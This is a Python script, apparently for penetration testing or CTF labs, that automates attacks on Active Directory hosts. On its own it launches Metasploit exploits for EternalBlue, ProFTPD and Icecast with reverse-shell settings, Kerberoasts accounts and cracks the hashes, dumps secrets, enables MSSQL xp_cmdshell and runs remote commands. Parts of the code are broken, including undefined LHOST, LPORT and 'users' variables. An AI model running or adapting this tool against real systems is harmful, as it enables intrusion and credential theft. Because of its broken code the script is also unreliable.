#!/usr/bin/python3

#To Download Files
	#python EnumADv2.py -D
#To run with RustScan
	#python EnumADv2.py -r <RHOST> -R 
#To run with NMAP
	#example python EnumADv2.py -r <RHOST> -n

#Things to do:
	#Add support for hashes file
	#Add NTLMRELAYX support
#The more information you feed the script the more it does (obviously)

import os
import argparse
import sys
import time
import importlib
from colorama import Fore
from pathlib import Path
from smbprotocol.connection import Connection, Dialects

print("Installing necessary tools if not already installed \n")
package_name = 'colorama'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now \n")
	os.system(f"pip3 install {package_name}")
package_name = 'smbprotocol'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now \n")
	os.system(f"pip3 install {package_name}")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET
                                                                                                                                                                        
parser = argparse.ArgumentParser(description="EnumADv2",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="EnumADv2", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
parser.add_argument("-u", "--USERNAME", action="store", help="Username")
parser.add_argument("-P", "--PASSWORD", action="store", help="Password")
parser.add_argument("-L", "--USERSFILE", action="store", help="Username File if you have one")
parser.add_argument("-n", "--NMAP", action="store_true", help="Run NMAP Instead of RustScan")
parser.add_argument("-R", "--RUST", action="store_true", help="Run RustScan Instead of NMAP, this is much faster")
parser.add_argument("-D", "--DOWNLOAD", action="store_true", help="Download Tools")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
LPORT = args.LPORT
LHOST = args.LHOST
DOMAIN = args.DOMAIN
DOWNLOAD = args.DOWNLOAD
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
NMAP = args.NMAP
RUST = args.RUST
USERSFILE = args.USERSFILE

def DOWN():
	content = ("/usr/bin/rustscan")
	if (os.path.isfile(content) == True):
	   	print(f"{GREEN}RustScan Installed{RESET}")
	if (os.path.isfile(content) != True):
	   	print(f"{RED}RustScan not installed, installing{RESET}")
	   	URL="https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" 
	   	os.system(f"wget -c --read-timeout=5 --tries=0 {URL}")
	   	os.system("sudo dpkg -i rustscan_2.0.1_amd64.deb")
	os.system("locate kerbrute_linux_amd64 > loc.txt")
	path = "loc.txt"
	with open (path, "r") as f:
		content = f.read()
		word = "dist/kerbrute_linux_amd64"
		if word in content:
			print(f"{YELLOW}Kerbrute installed not installing{RESET}")
		else:
			print(f"{MAGENTA}Installing kerbrute_linux_amd64")
	content = ("/usr/bin/ldapdomaindump")
	if (os.path.isfile(content) == True):
	   	print(f"{GREEN}LDAPDomainDump Installed{RESET}")
	if (os.path.isfile(content) != True):
		print(f"{RED}LDAPDomainDump not installed, installing{RESET}")
		os.system("pip3 install ldapdomaindump")
	content = ("/usr/local/bin/smbserver.py")
	if (os.path.isfile(content) == True):
		print(f"{GREEN}Impacket Installed{RESET}")
	if (os.path.isfile(content) != True):
		os.system("pip3 install impacket")
	content = ("/usr/bin/rlwrap")
	if (os.path.isfile(content) == True):
		print(f"{GREEN}rlwrap installed{RESET}")
	if (os.path.isfile(content) != True):
		os.system(f"sudo apt install rlwrap")
	content = ("/usr/bin/bloodhound-python")
	if (os.path.isfile(content) == True):
		print(f"{GREEN}Bloodhound-Python installed{RESET}")
	if (os.path.isfile(content) != True):
		os.system("pip3 install bloodhound")

def NMAP():
	path = "ports.txt"
	if (os.path.isfile(path) != True):
		print(f"{MAGENTA}Running NMAP and saving to ports.txt, this may take a while{RESET}")
		os.system(f"nmap -p- -vv -Pn {RHOST} > ports.txt")
		print(f"{GREEN}Done running scan{RESET}")

def RustScan():
	path="ports.txt"
	if (os.path.isfile(path) != True):
		print(f"{MAGENTA}Running RustScan and saving to ports.txt{RESET}")
		os.system(f"rustscan -u 5000 -a {RHOST} -- -Pn > ports.txt")
		print(f"{GREEN}Done running scan{RESET}")

def BLUE():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="445/tcp"
		if word in content:
			print(f"{MAGENTA}SMB is running, checking if it is vulnerable to anything with nmap scripts{RESET}\n")
			os.system(f"nmap -p 445 --script=smb-vuln* -Pn {RHOST} > blue.txt")
			with open ("blue.txt", "r") as f:
				content = f.read()
				word = "CVE:CVE-2017-0143"
				if word in content:
					print(f"{RED}Vulnerable to Eternal Blue{RESET} \n")
					os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set rhost {RHOST}; set lhost {LHOST}; set LPORT {LPORT}; run'")

def SMB():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="445/tcp"
		if word in content:
			print(f"{MAGENTA}Seeing if SMB is anonymous and saving output to SMB.txt{RESET}")
			os.system(f'smbclient -L "\\\\\\\\{RHOST}\\\\\" -U \" \"%\" " > SMB.txt')
			with open ("SMB.txt", "r") as f:
				content = f.read()
				word = "NT_STATUS_LOGON_FAILURE"
				if word in content:
					print(f"{GREEN}SMB does not seem to have anonymous access{RESET}")
					os.remove("SMB.txt")
				else:
					print(f"{YELLOW}SMB seems to allow anonymous access{RESET}")
def FTP():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="21/tcp"
		if word in content:
			print(f"{MAGENTA}FTP Running, trying some differnet things{RESET}")
			os.system(f"nmap -p 21 -sC -sV {RHOST} >> ports.txt")
			with open ("ports.txt", "r") as f:
				content = f.read()
				word = "ProFTPD 1.3.5"
				if word in content:
					print(f"{RED}PROFTPD 1.3.5 Running, exploiting now{RESET}")
					os.system(f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set lhost {LHOST}; set rhost {RHOST}; set lport {LPORT}; run'")
			if USERNAME is None and PASSWORD is None:
				print(f"{YELLOW}FTP Running mounting to folder FTP if anonymous access is allowed{RESET}")
				try:
					os.mkdir("FTP")
				except FileExistsError:
  					pass
				os.system(f"curlftpfs anonymous@{RHOST} FTP")
			if USERNAME is not None and PASSWORD is not None:
  				print(f"{YELLOW}FTP Running mounting to folder FTP with username {USERNAME} and password {PASSWORD}{RESET}")
  				try:
  					os.mkdir("FTP")
  				except FileExistsError:
  					pass
  				os.system(f"curlftpfs {USERNAME}:{PASSWORD}@{RHOST} FTP")

def MOUNT():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="2049/tcp"
		if word in content:
			print(f"{MAGENTA}Mount Running{RESET}")
			os.system(f"showmount -e {RHOST}")
			mount = input(f"Mount point running on {RHOST}: \n")
			try:
				os.mkdir("mount")
			except FileExistsError:
   				# directory already exists
   				pass
			os.system(f"sudo mount -t nfs {RHOST}:{mount} mount")

def ICE():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="8000/tcp"
		if word in content:
			print(f"{MAGENTA}Webserver on port 8000 running, checking service{RESET}")
			os.system(f"nmap -p 8000 -sC -sV {RHOST} -Pn > http.txt")
			os.system(f"curl -v http://{RHOST}:8000 >> http.txt")
			with open ("http.txt", "r") as f:
				content = f.read()
				print(content)
			path="http.txt"
			with open (path, "r") as f:
				content = f.read()
				word="Icecast streaming media server"
		if word in content:
			print(f"{YELLOW}Icecast is running, trying to exploit{RESET}")
			os.system(f"msfconsole -x 'use exploit/windows/http/icecast_header; set lhost {LHOST}; set rhost {RHOST}; set rport 8000; set lport {LPORT}; run'")

def DOM():
	if DOMAIN == None:
		path="ports.txt"
	with open (path, "r") as f:
		print(f"{GREEN}Getting Domain Name for {RHOST}{RESET}")
		os.system(f"crackmapexec smb {RHOST} -u administrator -p administrator | tail -n 1 | cut -d ']' -f 2 | cut -d '\\' -f 1 | tr -d \" \\t\\n\\r\" | sed -e 's/\x1b\[[0-9;]*m//g'  > domainname.txt")
		with open ("domainname.txt", "r") as f:
			content = f.read()
			print(f"{GREEN}Domain name is {YELLOW}{content} {RESET} \n")

def LDAPSEARCH():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="389/tcp"
	if word in content:
		print(f"LDAP Running")
		os.system(f"crackmapexec smb {RHOST} -u fdjakf -p fdafjklf | tail -n 1 | cut -d ']' -f 2 | cut -d '\' -f 1 | tr -d \ \" \\t\\n\\r\\\" | sed -e 's/\x1b\[[0-9;]*m//g' > domainname.txt")
		os.system(f"cat domainname.txt | cut -d '.' -f 1 > dom1.txt")
		os.system(f"cat domainname.txt | cut -d '.' -f 2 > dom2.txt")
		print(f"{RED}May have to run multiple times depending on VPN connection speed{RESET}")
		with open ("dom1.txt", "r") as f:
			x = f.read()
			print(x)
		with open ("dom2.txt", "r") as f:
			y = f.read()
			print(y)
		if USERNAME is None and PASSWORD is None:
			print(f"{MAGENTA}Trying Anonymous LDAP Login and saving any output to ldap.txt{RESET}")
			os.system(f"ldapsearch -H ldap://{RHOST} -x -b \"DC={x},DC={y}\" '(objectclass=person)' > ldap.txt")
			os.remove("dom1.txt")
			os.remove("dom2.txt")
			path = "ldap.txt"
			with open (path, "r") as f:
				content = f.read()
				word = "sAMAccountName"
				if word in content:
					print(f"{YELLOW}Anonymous LDAP login enabled{RESET}")
					os.system(f"cat ldap.txt | grep -i samaccountname > cut.txt")
					os.system(f"cut -d ':' -f 2 cut.txt > cut1.txt")
					os.system(f"cat cut1.txt| sed 's/ //g' > ldapusers.txt")
					os.remove("cut.txt")
					os.remove("cut1.txt")
					print(f"\n {YELLOW}Saved users to ldapusers.txt{RESET}")
					
		if USERNAME is not None and PASSWORD is not None:
			print(f"{MAGENTA}Trying to dump LDAP with username {YELLOW}{USERNAME} and password {YELLOW}{PASSWORD} {RESET}")
			os.system(f"ldapsearch -H ldap://{RHOST} -x -b \"DC={x},DC={y}\" '(objectclass=person)' -D {USERNAME} -w {PASSWORD} > ldap.txt")
			os.remove("dom1.txt")
			os.remove("dom2.txt")
			os.system("cat ldap.txt | grep -i description > description.txt")
			os.system(f"cat ldap.txt | grep -i samaccountname > cut.txt")
			os.system(f"cut -d ':' -f 2 cut.txt > cut1.txt")
			os.system(f"cat cut1.txt| sed 's/ //g' > ldapusers.txt")
			os.remove("cut.txt")
			os.remove("cut1.txt")
			print(f"\n {YELLOW}Saved users to ldapusers.txt{RESET}")

def LDAPDOMAINDUMP():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="389/tcp"
	if word in content:
		print(f"{YELLOW}LDAP Running, trying LDAPDOMAINDUMP and putting into folder LDAP{RESET}")
	try:
		os.mkdir("LDAP")
	except FileExistsError:
   		pass
	time.sleep(1)
	with open ("domainname.txt", "r") as f:
		y = f.read()
	os.chdir("LDAP")
	if USERNAME is not None and PASSWORD is not None:
		os.system(f"ldapdomaindump ldap://{RHOST} -u '{y}\\{USERNAME}' -p '{PASSWORD}'")
	if USERNAME is None and PASSWORD is None:
		os.system(f"ldapdomaindump ldap://{RHOST}:389")
	os.chdir('..')
	path = 'LDAP' 
	directory = os.listdir(path)
	if len(directory) == 0:
		print(f"{RED}User cannot do an LDAPDOMAINDUMP, sorry :( {RESET}")
	if len(directory) != 0:
		print(f"{YELLOW}Looks like user was able to do an LDAPDOMAINDUMP, LEEEETTTTTSSSS GOOOOOO")

def KLDAP():
	content = "ldapusers.txt"
	if (os.path.isfile(content) is not False):
		print(f"{YELLOW}{content} file found, trying some things{RESET}")
		with open ("domainname.txt", "r") as a:
			z = a.read()
			with open (content, "r") as f:
				os.system(f"GetNPUsers.py -no-pass -usersfile {f} {z}/ > impacket.txt")
				os.system(f"GetUserSPNs.py -no-pass -usersfile {f} {z}/ >> impacket.txt")
				with open ("impacket.txt", "r") as f:
					content = f.read()
					word = "$krb"
					if word in content:
						print(f"{RED}Found Kerberoastable User, check impacket.txt{RESET} \n")	
						os.system(f"cut -d '_' -f 6 impacket.txt > cut1.txt")
						os.system(f"cut -d '+' -f 3 cut1.txt > cut2.txt")
						os.system(f"cut -d ']' -f 5 cut2.txt > cut3.txt")
						os.system(f'cat cut3.txt | tr -d " \t\n\r" > hash.txt')
						os.remove("cut1.txt")
						os.remove("cut2.txt")
						os.remove("cut3.txt")
						with open ("hash.txt", "r") as f:
							content = f.read()
							print(f"{GREEN}Kerberostable hash is {RED}{content}{RESET} \n")
						os.system("cut -d '$' -f 4 hash.txt > cut4.txt")
						os.system("cut -d '@' -f 1 cut4.txt > keruser.txt")
						os.remove("cut4.txt")
						with open ("keruser.txt", "r") as f:
							content = f.read()
							print(f"{YELLOW}Kerberostable username is {RED}{content}{RESET} \n")
						if (os.path.isfile("johnpass.txt") is not True):
							print(f"{YELLOW}Trying to crack KRB hash {RESET}")
							os.system("john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 > johnpass.txt")
							os.system("cut -d '/' -f 6 johnpass.txt > cut5.txt")
							os.system("cut -d '(' -f 1 cut5.txt > cut6.txt")
							os.system('cat cut6.txt | tr -d " \t\n\r" > johnpass.txt')
							os.remove('cut5.txt')
							os.remove('cut6.txt')
							with open ("johnpass.txt", "r") as f:
								content = f.read()
								print(f"{YELLOW}Kerberostable password is {RED}{content}{RESET} \n")
							os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami' >> CommandExecution.txt")

def MSSQL():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="1433/tcp"
	if word in content:
		print(f"{YELLOW}MSSQL is running{RESET}")
	if USERNAME is not None and PASSWORD is not None:
		with open ("domainname.txt", "r") as f:
			y = f.read()
		print(f"{YELLOW}Attempeting to turn on xp_cmdshell and command execution with crackmapexec{RESET}")
		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"sp_configure 'show advanced options', '1'\" -c")
		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"RECONFIGURE\" -c")
		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"sp_configure 'xp_cmdshell', '1'\" -c")
		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"RECONFIGURE\" -c")
		os.system(f"crackmapexec mssql {RHOST} -u {USERNAME} -p {PASSWORD} -X whoami >> CommandExecution.txt")
		
def RPC():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="135/tcp"
		if word in content:
			os.system("touch users1.txt")
			if USERNAME is None and PASSWORD is None:
				print(f"{YELLOW}RPCClient is running, trying anonymous access{RESET}")
				os.system(f'rpcclient -U "" -N {RHOST} -c "enumdomusers" > users1.txt')
				with open ("users1.txt", "r") as a:
					content = a.read()
					word = "Administrator"
					if word in content:
						print(f"{GREEN}Anonymous RPC access allowed, making rpcusers.txt file{RESET}")
						os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
						os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
						os.remove("cut1.txt")
						os.remove("users1.txt")
			if USERNAME is not None and PASSWORD is not None:
				with open ("domainname.txt", "r") as a:
					z = a.read()
				os.system(f"rpcclient -U {z}/{USERNAME}%{PASSWORD} -N {RHOST} -c 'enumdomusers > users1.txt'")
				with open ("users1.txt", "r") as f:
					if os.stat('users1.txt').st_size != 0:
						print(f"{YELLOW}Looks like user can enumerate users through RPC")
						content = f.read()
						word = "Administrator"
						if word in content:
							os.system(f"{YELLOW}Trying to attack RPC with {USERNAME} and {PASSWORD} domain name {z}")
							os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
							os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
							os.remove("cut1.txt")
							os.remove("users1.txt")
							print(f"{YELLOW}Created username file under rpcusers.txt{RESET}")
					if os.stat('users1.txt').st_size == 0:
						print(f'{RED}User cannot enumerate users in RPC, sorry{RESET}')
						os.remove('users1.txt')
	

def KRPC():
	content = "rpcusers.txt"
	if (os.path.isfile(content) is not False):
		print(f"{YELLOW}{content} file found, trying some things{RESET}")
		with open ("domainname.txt", "r") as a:
			z = a.read()
			with open (content, "r") as f:
				y = f.read()
				os.system(f"GetNPUsers.py -no-pass -usersfile {content} {z}/ > impacket.txt")
				os.system(f"GetUserSPNs.py -no-pass -usersfile {content} {z}/ >> impacket.txt")
				with open ("impacket.txt", "r") as f:
					content = f.read()
					word = "$krb"
					if word in content:
						print(f"{RED}Found Kerberoastable User, check impacket.txt{RESET} \n")	
						os.system(f"cut -d '_' -f 6 impacket.txt > cut1.txt")
						os.system(f"cut -d '+' -f 3 cut1.txt > cut2.txt")
						os.system(f"cut -d ']' -f 5 cut2.txt > cut3.txt")
						os.system(f'cat cut3.txt | tr -d " \t\n\r" > hash.txt')
						os.remove("cut1.txt")
						os.remove("cut2.txt")
						os.remove("cut3.txt")
						with open ("hash.txt", "r") as f:
							content = f.read()
							print(f"{GREEN}Kerberostable hash is {RED}{content}{RESET} \n")
						os.system("cut -d '$' -f 4 hash.txt > cut4.txt")
						os.system("cut -d '@' -f 1 cut4.txt > keruser.txt")
						os.remove("cut4.txt")
						with open ("keruser.txt", "r") as f:
							content = f.read()
							print(f"{YELLOW}Kerberostable username is {RED}{content}{RESET} \n")
						print(f"{YELLOW}Trying to crack KRB hash {RESET}")
						os.system("john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 > johnpass.txt")
						os.system("cut -d '/' -f 6 johnpass.txt > cut5.txt")
						os.system("cut -d '(' -f 1 cut5.txt > cut6.txt")
						os.system('cat cut6.txt | tr -d " \t\n\r" > johnpass.txt')
						os.remove('cut5.txt')
						os.remove('cut6.txt')
						with open ("johnpass.txt", "r") as f:
							content = f.read()
							print(f"{YELLOW}Kerberostable password is {RED}{content}{RESET} \n")
						os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami' >> CommandExecution.txt")

def IMPACKET():
	if USERNAME == None and PASSWORD == None and USERSFILE is not None:
		with open ("domainname.txt", "r") as f:
			y = f.read()
		os.system(f"sudo echo {RHOST}    {y} >> /etc/hosts")
		content = users
		if (os.path.isfile(content) == True):
			print(f"{YELLOW}{content} file found, trying some things{RESET}")
			with open ("domainname.txt", "r") as f:
				y = f.read()
				os.system(f"GetNPUsers.py -no-pass -usersfile {users} {y}")
				os.system(f"GetUserSPNs.py -no-pass -usersfile {users} {y}")
	if USERNAME is not None and PASSWORD is not None:
		print(f"{YELLOW}Running Impacket attacks with {USERNAME} and {PASSWORD}{RESET} \n")
		with open ("domainname.txt", "r") as f:
			y = f.read()
			os.system(f"GetADUsers.py {y}/{USERNAME}:{PASSWORD} > impacket.txt")
			os.system(f"GetNPUsers.py {y}/{USERNAME}:{PASSWORD} >> impacket.txt")
			os.system(f"GetNPUsers.py {y}/{USERNAME}:{PASSWORD} -request > impacket.txt")
			os.system(f"GetUserSPNs.py {y}/{USERNAME}:{PASSWORD} >> impacket.txt")
			os.system(f"GetUserSPNs.py {y}/{USERNAME}:{PASSWORD} -request >> impacket.txt")
			os.system(f"lookupsid.py {y}/{USERNAME}:{PASSWORD}@{y} >> impacket.txt")
			os.system(f"secretsdump.py {y}/{USERNAME}:{PASSWORD}@{y} > secretsdump.txt")
	with open ("impacket.txt", "r") as f:
		content = f.read()
		print(f"{MAGENTA}Hopefully we got something from impacket, if not... that is ok just keep pushing\n {RESET}")
		time.sleep(3)
		print(content)

def CRACKMAPEXEC():
	if USERNAME is None and PASSWORD is None and USERSFILE is None:
		if (os.path.isfile("johnpass.txt") == True):
			print(f"\n{YELLOW}Running Crackmapexec if possible{RESET} \n")
			print(f"{YELLOW}Saving everything to crack.txt{RED}")
			print(f"{RED}If screen seems frozen you are good and everything is being saved, just hit enter after a minute or two{RESET} \n")
			c = "crackmapexec smb"
			w = "crackmapexec winrm"
			l = "crackmapexec ldap"
			s = "crackmapexec ssh"
			path = "crack.txt"
			os.system(f"{c} {RHOST} -u keruser.txt -p johnpass.txt --shares --sessions --loggedon-users --users --pass-pol > {path}")
			os.system(f"{c} {RHOST} -u keruser.txt -p johnpass.txt > crack_smb.txt")
			with open (f"crack_smb.txt", "r") as f:
				content = f.read()
				word = "Pwn3d!"
				if word in content:
					print(f"\n{RED}***Pwn3d! system with {YELLOW}{c}{RED}***{RESET}")
					time.sleep(2)
			os.system(f"{l} {RHOST} -u keruser.txt -p johnpass.txt --admin-count --trusted-for-delegation --password-not-required --users --groups >> {path}")
			os.system(f"{l} {RHOST} -u keruser.txt -p johnpass.txt > crack_ldap.txt")
			with open (f"crack_ldap.txt", "r") as f:
				content = f.read()
				word = "Pwn3d!"
				if word in content:
					print(f"\n{RED}***Pwn3d! system with {YELLOW}{l}{RED}***{RESET}")
					time.sleep(2)
			os.system(f"{w} {RHOST} -u keruser.txt -p johnpass.txt >> {path}")
			os.system(f"{w} {RHOST} -u keruser.txt -p johnpass.txt > crack_winrm.txt")
			with open (f"crack_winrm.txt", "r") as f:
				content = f.read()
				word = "Pwn3d!"
				if word in content:
					print(f"\n{RED}***Pwn3d! system with {YELLOW}{w}{RED}***{RESET}")
					time.sleep(2)
			os.system(f"{s} {RHOST} -u keruser.txt -p johnpass.txt --shares --sessions --loggedon-users --users --pass-pol > {path}")
			os.system(f"{s} {RHOST} -u keruser.txt -p johnpass.txt > crack_ssh.txt")
			with open (f"crack_ssh.txt", "r") as f:
				content = f.read()
				word = "Pwn3d!"
				if word in content:
					print(f"\n{RED}***Pwn3d! system with {YELLOW}{s}{RED}***{RESET}")
					time.sleep(2)
			
	if USERNAME is not None and PASSWORD is not None:
		c = "crackmapexec smb"
		w = "crackmapexec winrm"
		l = "crackmapexec ldap"
		s = "crackmapexec ssh"
		path = "crack.txt"
		os.system(f"{c} {RHOST} -u {USERNAME} -p {PASSWORD} --shares --groups --sessions --loggedon-users --users --pass-pol > {path}")
		os.system(f"{l} {RHOST} -u {USERNAME} -p {PASSWORD} --admin-count --trusted-for-delegation --password-not-required --users --groups >> {path}")
		os.system(f"{w} {RHOST} -u {USERNAME} -p {PASSWORD} -X whoami >> {path}")
		os.system(f"{s} {RHOST} -u {USERNAME} -p {PASSWORD} >> {path}")
		with open (f"crack.txt", "r") as f:
			content = f.read()
			print(content)
			word = "Pwn3d!"
			if word in content:
				print(f"{MAGENTA}Pwn3d! something{RESET} \n")
				os.system("cat crack.txt | grep 'Pwn3d!'")
				time.sleep(3)
def BLOOD():
	if USERNAME is not None and PASSWORD is not None:
		print(f"{YELLOW}Running Bloodhound with user {USERNAME} and password {PASSWORD}, if you get errors then user cannot run{RESET} \n")
		with open ("domainname.txt", "r") as a:
				z = a.read()
		os.system("mkdir Blood")
		os.system("cd Blood")
		os.system(f"bloodhound-python -u '{USERNAME}' -p '{PASSWORD}' -ns {RHOST} -d {z} -c all")
		os.system("cd ..")
		path ='Blood'
		directory = os.listdir(path)
		if len(directory) == 0:
			print(f"{RED}Sorry... User cannot do a bloodhound-python dump :( {RESET} \n")
		if len(directory) != 0:
			print(f"{YELLOW}Helllzzzz yessssss... bloodhound-python has been dumped {RESET} \n")

if DOWNLOAD is not False:
	DOWN()
if RustScan is not False:
	RustScan()
if NMAP is not False:
	NMAP()
if RHOST is not False:
	DOM()
	BLUE()
	RPC()
	KRPC()
	LDAPSEARCH()
	KLDAP()
	IMPACKET()
	CRACKMAPEXEC()
	MSSQL()
	MOUNT()
	LDAPDOMAINDUMP()
	ICE()
	BLOOD()
	FTP()
	SMB()
